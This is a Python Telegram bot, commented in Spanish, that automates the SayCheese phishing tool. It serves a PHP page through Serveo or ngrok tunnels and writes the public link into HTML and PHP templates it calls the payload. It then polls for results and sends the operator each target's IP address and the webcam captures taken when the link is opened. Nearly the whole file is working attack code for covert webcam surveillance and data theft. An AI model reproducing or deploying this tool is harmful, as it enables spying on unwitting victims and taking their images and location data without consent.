import os
import subprocess
import time
import random
import re
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, filters, MessageHandler

# Configuración del bot
TOKEN = os.getenv("TOKEN", "TU_TOKEN_AQUÍ")  # Usa variables de entorno
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "TU_CHAT_ID")

# Banner (simulado)
def banner():
    return (
        "SayCheese v1.1\n"
        "Original by github.com/thelinuxchoice/saycheese\n"
        "Reborn by Noob Hackers\n"
        "Note: Please ensure you have an active internet connection to get a link!"
    )

# Verificar dependencias
def check_dependencies():
    if not os.path.exists("/usr/bin/php") and not os.path.exists("/usr/local/bin/php"):
        return "Error: PHP is required but not installed. Please install it."
    if not os.path.exists("ngrok"):
        return "Error: Ngrok not found. Downloading it is required."
    return None

# Detener procesos
def stop_processes():
    for proc in ["ngrok", "php"]:
        subprocess.run(["pkill", "-f", proc], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Capturar IP
def catch_ip():
    if os.path.exists("ip.txt"):
        with open("ip.txt", "r") as f:
            ip = re.search(r"IP:\s*(\S+)", f.read())
            if ip:
                with open("saved.ip.txt", "a") as saved:
                    saved.write(f"{ip.group(1)}\n")
                return ip.group(1)
    return None

# Iniciar servidor con Serveo
def start_serveo(subdomain=None):
    stop_processes()
    port = 3333
    if subdomain:
        cmd = f"ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R {subdomain}:80:localhost:{port} serveo.net"
    else:
        cmd = f"ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:{port} serveo.net"
    
    with open("sendlink", "w") as f:
        subprocess.Popen(cmd, shell=True, stdout=f, stderr=subprocess.PIPE)
    time.sleep(8)
    
    subprocess.Popen(["php", "-S", f"localhost:{port}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(3)
    
    with open("sendlink", "r") as f:
        link = re.search(r"https://[0-9a-z]*\.serveo.net", f.read())
        return link.group(0) if link else None

# Iniciar servidor con Ngrok
def start_ngrok():
    if not os.path.exists("ngrok"):
        subprocess.run(["wget", "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(["unzip", "ngrok-stable-linux-amd64.zip"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        os.chmod("ngrok", 0o755)
        os.remove("ngrok-stable-linux-amd64.zip")
    
    stop_processes()
    port = 3333
    subprocess.Popen(["php", "-S", f"127.0.0.1:{port}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(2)
    subprocess.Popen(["./ngrok", "http", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(10)
    
    link = subprocess.check_output("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9A-Za-z.-]*\.ngrok.io'", shell=True).decode().strip()
    return link

# Generar payload
def generate_payload(link):
    for src, dst in [("grabcam.html", "index2.html"), ("template.php", "index.php")]:
        with open(src, "r") as f:
            content = f.read().replace("forwarding_link", link)
        with open(dst, "w") as f:
            f.write(content)

# Verificar resultados
async def check_results(context: ContextTypes.DEFAULT_TYPE):
    if os.path.exists("ip.txt"):
        ip = catch_ip()
        if ip:
            await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"Target opened the link!\nIP: {ip}")
            os.remove("ip.txt")
    
    if os.path.exists("Log.log"):
        with open("Log.log", "rb") as f:
            await context.bot.send_document(chat_id=ADMIN_CHAT_ID, document=f, caption="Cam file received!")
        os.remove("Log.log")

# Comando /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.message.chat_id) != ADMIN_CHAT_ID:
        await update.message.reply_text("No tienes permiso para usar este bot.")
        return
    
    dep_error = check_dependencies()
    if dep_error:
        await update.message.reply_text(dep_error)
        return
    
    await update.message.reply_text(banner())
    await update.message.reply_text("Choose a port forwarding option:\n1. Serveo.net\n2. Ngrok\nReply with 1 or 2.")
    context.user_data["waiting_for_option"] = True

# Manejar respuesta del usuario
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.message.chat_id) != ADMIN_CHAT_ID or not context.user_data.get("waiting_for_option"):
        return
    
    option = update.message.text.strip()
    context.user_data["waiting_for_option"] = False
    
    if option == "1":
        subdomain = f"grabcam{random.randint(1000, 9999)}"
        await update.message.reply_text(f"Using Serveo with subdomain: {subdomain}")
        link = start_serveo(subdomain)
        if link:
            generate_payload(link)
            await update.message.reply_text(f"Direct link: {link}\nWaiting for targets...")
        else:
            await update.message.reply_text("Failed to start Serveo.")
    
    elif option == "2":
        link = start_ngrok()
        if link:
            generate_payload(link)
            await update.message.reply_text(f"Direct link: {link}\nWaiting for targets...")
        else:
            await update.message.reply_text("Failed to start Ngrok.")
    
    else:
        await update.message.reply_text("Invalid option! Please reply with 1 or 2.")
        context.user_data["waiting_for_option"] = True

# Comando /stop
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.message.chat_id) != ADMIN_CHAT_ID:
        await update.message.reply_text("No tienes permiso para usar este bot.")
        return
    
    stop_processes()
    await update.message.reply_text("Server stopped.")

# Función principal
def main():
    try:
        application = Application.builder().token(TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("stop", stop))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        application.job_queue.run_repeating(check_results, interval=5)
        application.run_polling()
    except Exception as e:
        print(f"Error running bot: {e}")

if __name__ == "__main__":
    main()